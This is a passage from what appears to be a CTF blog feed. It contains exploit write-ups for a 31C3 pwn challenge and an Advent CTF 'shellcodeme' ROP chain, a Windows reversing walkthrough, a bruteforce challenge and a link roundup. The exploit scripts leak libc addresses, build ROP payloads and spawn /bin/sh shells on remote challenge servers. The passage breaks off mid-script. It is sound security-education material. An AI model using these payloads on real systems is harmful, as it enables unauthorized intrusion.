</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;hex: (.*)&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'><span class="k">if</span> <span class="n">m</span><span class="p">:</span>
</span><span class='line'>  <span class="n">PRINTF</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] found printf: </span><span class="si">%x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'><span class="n">SYSTEM</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">63664</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] system at </span><span class="si">%x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># spam system into buf</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span>        
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>    <span class="c"># address of system() will be stored in buf</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>    <span class="c"># buf+8</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>    <span class="c"># buf+16</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;7</span><span class="se">\n</span><span class="s">&quot;</span>        <span class="c"># use an address further into buf (parsers+7*16)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;/bin/sh</span><span class="se">\n</span><span class="s">&quot;</span>  <span class="c"># because this will overwrite the first few bytes</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>         <span class="c"># send payload, causing it to call system(&#39;/bin/sh&#39;)</span>
</span><span class='line'>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>  <span class="c"># interact with spawned shell</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>I ran the script and crossed my fingers:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/31c3/cfy<span class="nv">$ </span>python exploit.py
</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
</span><span class='line'>0<span class="o">)</span> parse from hex
</span><span class='line'>1<span class="o">)</span> parse from dec
</span><span class='line'>2<span class="o">)</span> parse from pointer
</span><span class='line'>3<span class="o">)</span> quit
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Please enter your number: dec: 140686779126752
</span><span class='line'>hex: 0x7ff4317e93e0
</span><span class='line'>
</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
</span><span class='line'>0<span class="o">)</span> parse from hex
</span><span class='line'>1<span class="o">)</span> parse from dec
</span><span class='line'>2<span class="o">)</span> parse from pointer
</span><span class='line'>3<span class="o">)</span> quit
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> found <span class="nb">printf</span>: 7ff4317e93e0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> system at 7ff4317d9b30
</span><span class='line'>
</span><span class='line'>Please enter your number:
</span><span class='line'>dec: 0
</span><span class='line'>hex: 0x0
</span><span class='line'>
</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
</span><span class='line'>0<span class="o">)</span> parse from hex
</span><span class='line'>1<span class="o">)</span> parse from dec
</span><span class='line'>2<span class="o">)</span> parse from pointer
</span><span class='line'>3<span class="o">)</span> quit
</span><span class='line'>
</span><span class='line'>Please enter your number: id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>cfy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>cfy<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>cfy<span class="o">)</span>
</span><span class='line'>cat /home/cfy/flag
</span><span class='line'>THANK YOU WARIO!
</span><span class='line'>
</span><span class='line'>BUT OUR PRINCESS IS IN
</span><span class='line'>ANOTHER CASTLE!
</span><span class='line'>
</span><span class='line'>Login: cfy_pwn // 31C3_G0nna_keep&lt;on&gt;grynding
</span></code></pre></td></tr></table></div></figure>


<p>So the flag was <code>31C3_G0nna_keep&lt;on&gt;grynding</code>. I thought this was quite tough based on the amount of points&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackvent 2014 - Reversing Day 23]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/27/hackvent-2014-reversing-day-23/"/>
    <updated>2014-12-27T14:45:39+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/27/hackvent-2014-reversing-day-23</id>
    <content type="html"><![CDATA[<p>Someone passed me a binary and said &lsquo;Here, you&rsquo;ll enjoy this one&rsquo;. I most certainly did&hellip;</p>

<!-- more -->


<p>The guy also gave one hint, which I needed later. I started checking out the binary, which turned out to be a 32-bit Windows PE executable. I downloaded <a href="http://modern.ie">an XP VM</a> and an old, familiar friend: <a href="http://www.ollydbg.de">OllyDbg 1.10</a>, arguably the best debugger for Windows.</p>

<p>Starting up the binary, I was presented with a simple dialog:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-00.png" alt="" /></p>

<p>I tried entering a string to check, but it didn&rsquo;t do anything. I set a few breakpoints, but when I switched back to the dialog, the binary crashed!</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-01.png" alt="" /></p>

<p>What was going on here? <code>IsDebuggerPresent</code> was not referenced in the code, but maybe something else was going on. I set a memory breakpoint on a piece of code where I previously had set a breakpoint and pressed F9.</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-02.png" alt="" /></p>

<p>Then, the binary stopped here:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-03.png" alt="" /></p>

<p>Quite interesting! The binary checks itself for <code>0xCC</code> bytes, aka <code>INT 3</code>. There were two of those checks, one at <code>0x4025e0</code> and one at <code>0x402536</code>. I modified the following <code>JNZ</code> to a <code>JMP</code> so the code would never do anything when it found a breakpoint. Now I could set breakpoints where ever I liked!</p>

<p>Back to the <code>SendDlgItemMessageA</code> calls.</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-04.png" alt="" /></p>

<p>The binary checks the length of our input and if it is exactly <code>0x1D</code> or 29 bytes, it continues by fetching the input. It checks the input for <code>-</code> characters at specific places. From this I deduced that the format of the input should be <code>ABCD-DEFG-HIJK-LMNO-PQRS-TUVW</code>. I entered that and pressed check, ending up here:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-06.png" alt="" /></p>

<p>The code now sends a message to its message queue, but I didn&rsquo;t know the location of the handler. No worries; I stepped into the call with F7 until I was in NTDLL.dll, and then set a memory breakpoint on the code area at <code>0x401000</code>. A break-on-access also works.</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-07.png" alt="" /></p>

<p>After pressing F9, this landed me at the handler!</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-08.png" alt="" /></p>

<p>I traced through this function with F7, finally ending up here:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-09.png" alt="" /></p>

<p>The code takes the first four bytes of our input, XORs them with a certain value and then proceeds to call the code at the resulting value&hellip; Only problem is, there was no code at <code>0x703234BD</code>! I remembered the hint I got at the beginning: &ldquo;the flag probably starts with <code>HV14</code>&rdquo;. I changed the input to <code>HV14-ABCD-DEFG-HIJK-LMNO-PQRS</code> and restarted it again, to end up at the same CALL EAX:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-10.png" alt="" /></p>

<p>With a single F7, I ended up here:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-11.png" alt="" /></p>

<p>Here, some tricky stuff starts happening! A call to <code>VirtualProtect</code> makes the code in front of us writeable, and the binary starts modifying that code:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-12.png" alt="" /></p>

<p>Cool <em>and</em> a nice anti-disassembler tactic, this self-modifying code. It can be tricky to reverse, in this case especially the call that emerges:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-13.png" alt="" /></p>

<p>Carefully using F7, I traced passed this anti-disassembler trick and found myself at this CALL ECX:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-14.png" alt="" /></p>

<p>I stepped into it, landing at this position. Now it becomes really interesting, the binary apparently calls a function that does <em>something</em> with our input, then sends another message to the message queue. I decided to place a breakpoint at <code>0x4022B3</code> and pressed F9; I would examine the function later. First see what happens:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-15.png" alt="" /></p>

<p>Indeed, we land at the message handler. After decrypting a string, the binary does a byte-by-byte comparison of our mangled input and some other buffer:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-17.png" alt="" /></p>

<p>The code that comes after it congratulates us, but only if the buffer equals our mangled input. I decided to find out where our input was being mangled. I restarted the binary and set a memory breakpoint on the first four bytes of the input:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-18.png" alt="" /></p>

<p>Pressing F9, the code breaks at the CALL EAX, of course. Another F9 lands us here:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-19.png" alt="" /></p>

<p>Ah! The first byte of our input, &lsquo;H&rsquo;, is being XOR&#8217;ed with another value. This is repeated for all the bytes in the input:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-20.png" alt="" /></p>

<p>I wrote down (literally!) all the values that were used in <code>AL</code> and finally, I ended up at the REPE CMPS instruction:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-21.png" alt="" /></p>

<p>I took note of the values at <code>EDI</code> and together with the values from the XOR statement earlier, I had all the thing necessary to grab the flag! Sprinkle in some Python magic:</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-22.png" alt="" /></p>

<p>And we have the flag!</p>

<p><img src="http://barrebas.github.io/assets/hv14/hv14-23.png" alt="" /></p>

<p>It has been a while since I got to use OllyDbg to reverse a Windows binary. Between the self-modifying code, the use of the flag and <code>SendMessage</code> to control code execution, this was a very enjoyable challenge!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Staring Into /dev/null Weekly Roundup]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/27/staring-into-slash-dev-slash-null-weekly-roundup/"/>
    <updated>2014-12-27T09:52:56+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/27/staring-into-slash-dev-slash-null-weekly-roundup</id>
    <content type="html"><![CDATA[<p>Extra, extra! Interesting stuff found on the internet in the past week!</p>

<!-- more -->


<p>This week really kicked off some awesome work on format string vulnerabilities! First, <a href="https://twitter.com/leonjza">leonjza</a> shows the process of <a href="https://asciinema.org/a/14960">writing an format string exploit</a> in visual form. Next, <a href="http://r3v3rs3r.wordpress.com">c0ne</a> made a <a href="http://r3v3rs3r.wordpress.com/2014/12/26/i-love-format-string-vulnerabilities/">great script</a> to help with the tedious work that is involved when exploiting format strings.</p>

<p>I came across this technique for <a href="http://www.shelliscoming.com/2014/03/hidden-bind-shell-keep-your-shellcode.html">hiding bind shells</a> by <a href="https://twitter.com/borjamerino">@BorjaMerino</a>. I wonder if it is possible to port this to Linux&hellip;</p>

<p>To combat holiday boredom, a new VM was released on Vulnhub the other day, named <a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus</a> by <a href="https://twitter.com/TheKnapsy">Knapsy</a>. It&rsquo;s a very fun and tricky VM, I recommend it!</p>

<p>Super useful, something I have seen before, but then I lost the link: <a href="http://redsymbol.net/articles/unofficial-bash-strict-mode/">Use the Unofficial Bash Strict Mode (Unless You Looove Debugging)</a> by Aaron Maxwell aka <a href="https://twitter.com/redsymbol/">redsymbol</a>.</p>

<p>Lastly, I always enjoy writeups about breaking botnet panels. This one by Malware Tech <a href="http://www.malwaretech.com/2014/12/phase-bot-exploiting-c-panel.html">is quite entertaining</a>.</p>

<p>I&rsquo;d like to make this a recurring thing. Let me know what you think about it!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Advent CTF 2014 - Bruteforce]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-bruteforce/"/>
    <updated>2014-12-24T11:38:35+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-bruteforce</id>
    <content type="html"><![CDATA[<p>Bruteforce they said, it&rsquo;ll be fun, they said&hellip;</p>

<!-- more -->


<p>We&rsquo;re given only a binary and are told that we shouldn&rsquo;t bruteforce the server. The binary, when started, only says &ldquo;calculating&hellip;..&rdquo; and not much else. Upon closer examination, I found that it does some calculations and checks a certain number before printing out the flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   0x400703: movsxd rax,DWORD PTR [rsp+0x8]
</span><span class='line'>=&gt; 0x400708:   cmp    rax,QWORD PTR [rip+0x200969]        # 0x601078
</span><span class='line'>   0x40070f:  je     0x400780
</span><span class='line'>   0x400711:  add    DWORD PTR [rsp+0xc],0x1</span></code></pre></td></tr></table></div></figure>


<p>If <code>eax</code> matches the value at <code>0x601078</code>, then the code jumps here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  400780:    8b 54 24 0c             mov    edx,DWORD PTR [rsp+0xc]
</span><span class='line'>  400784: be b1 09 40 00          mov    esi,0x4009b1 ; bruteforce : 0x4009b1 ("the flag is: ADCTF_%d\n")
</span><span class='line'>  400789: bf 01 00 00 00          mov    edi,0x1
</span><span class='line'>  40078e: 31 c0                   xor    eax,eax
</span><span class='line'>  400790: e8 7b fe ff ff          call   400610 &lt;__printf_chk@plt&gt;</span></code></pre></td></tr></table></div></figure>


<p>So the calculates until a certain value is found and then dumps the flag. I found a couple of rate-limiting things, such as these syscalls:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  4008e0:    49 89 ce                mov    r14,rcx
</span><span class='line'>  4008e3: 48 89 fa                mov    rdx,rdi
</span><span class='line'>  4008e6: 4c 89 d7                mov    rdi,r10
</span><span class='line'>  4008e9: 4c 89 ce                mov    rsi,r9
</span><span class='line'>  4008ec: 48 31 c0                xor    rax,rax
</span><span class='line'>  4008ef: b0 23                   mov    al,0x23  ; nanosleep
</span><span class='line'>  4008f1: 0f 05                   syscall </span></code></pre></td></tr></table></div></figure>


<p>I didn&rsquo;t want to slow it down so I nop&#8217;ed out three of those syscalls, along with the calls to putchar and printf. I ran the binary, occasionaly checking at which it was&hellip; but it still was very slow! Time for a different approach&hellip;</p>

<p>Running the binary and breaking at the comparison at <code>0x400708</code>, I compared the value at <code>rsp+0x8</code> and <code>rsp+0xc</code> (which is used to print out the flag eventually). I noticed these numbers:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rsp+0x8      rsp+0xc
</span><span class='line'>-------------------
</span><span class='line'>  1           1
</span><span class='line'>  2           2
</span><span class='line'>  3           5
</span><span class='line'>  4           7
</span><span class='line'>  5           11</span></code></pre></td></tr></table></div></figure>


<p>It didn&rsquo;t take me long to realize we&rsquo;re looking at prime numbers here. This binary bruteforces prime numbers and prints out the prime number when the comparison at <code>0x400708</code> is true. <code>eax</code> contains the ordinal number of the last prime found and is compared to <code>0x989680</code>. That would be 10,000,000 in decimal. I quickly located a list of <a href="https://primes.utm.edu/lists/small/millions/">prime numbers</a> and found the 10th million: 179,424,673.</p>

<p>Therefore, the flag was: <code>ADCTF_179424673</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Advent CTF 2014 - Shellcodeme]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme/"/>
    <updated>2014-12-24T11:37:46+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme</id>
    <content type="html"><![CDATA[<p>Why o why do we take part in these painful exercises? Again, <code>shellcodeme</code> seemed like such a simple task. But looks, like all the other challenges of Advent CTF 2014, can be deceiving!</p>

<!-- more -->


<p></p>

<p>We&rsquo;re given a binary and the C source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/* gcc -m32 -fno-stack-protector -znoexecstack -o shellcodeme shellcodeme.c */</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define SHELLCODE_LEN 1024</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
</span><span class='line'>    <span class="n">buf</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x20000000</span><span class="p">,</span> <span class="n">SHELLCODE_LEN</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="n">SHELLCODE_LEN</span><span class="p">);</span>
</span><span class='line'>    <span class="n">mprotect</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x20000000</span><span class="p">,</span> <span class="n">SHELLCODE_LEN</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">);</span> <span class="c1">// no no no~</span>
</span><span class='line'>    <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">buf</span><span class="p">)();</span> <span class="c1">// SEGV! no exec. can you execute shellcode?</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The bug was kind of obvious:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="n">SHELLCODE_LEN</span><span class="p">);</span> <span class="c1">// read to the location of buf itself</span>
</span></code></pre></td></tr></table></div></figure>


<p>The code will read in the shellcode at <code>&amp;buf</code>, not <code>buf</code>. This will allow us to overwrite that pointer and take control of execution at this line of code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">buf</span><span class="p">)();</span> <span class="c1">// SEGV! no exec. can you execute shellcode?</span>
</span></code></pre></td></tr></table></div></figure>


<p>I chose to overwrite the <code>buf</code> pointer with <code>0x080484fc</code>, which is <code>leave; ret</code>. This will restore the stack and land us in my ROP chain. The basic idea is to re-use <code>mprotect</code> and <code>read</code> to read in the shellcode and then return to it. The following python code did just that, landing me a shell on the box:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">POP3RET</span> <span class="o">=</span> <span class="mh">0x804855d</span>
</span><span class='line'><span class="n">MPROTECT</span> <span class="o">=</span> <span class="mh">0x8048330</span>
</span><span class='line'><span class="n">READ</span> <span class="o">=</span> <span class="mh">0x8048340</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080484fc</span><span class="p">)</span>        <span class="c"># leave; ret (restore stack)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span>               <span class="c"># dummy </span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">MPROTECT</span><span class="p">)</span>          <span class="c"># mprotect shellcode area back to rwx</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP3RET</span><span class="p">)</span>           <span class="c"># fix stack</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>       <span class="c"># addr of shellcode</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>           <span class="c"># size (page-aligned)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>              <span class="c"># PROT_READ|PROT_EXEC|PROT_WRITE</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">READ</span><span class="p">)</span>              <span class="c"># read in our shellcode</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP3RET</span><span class="p">)</span>           <span class="c"># fix stack</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>              <span class="c"># stdin</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>       <span class="c"># address</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>             <span class="c"># copied value</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>       <span class="c"># return to shellcode</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwnable.katsudon.org&#39;</span><span class="p">,</span> <span class="mi">33201</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># send first stage</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># for some reason, this delay was necessary</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># send shellcode, spawns /bin/sh</span>
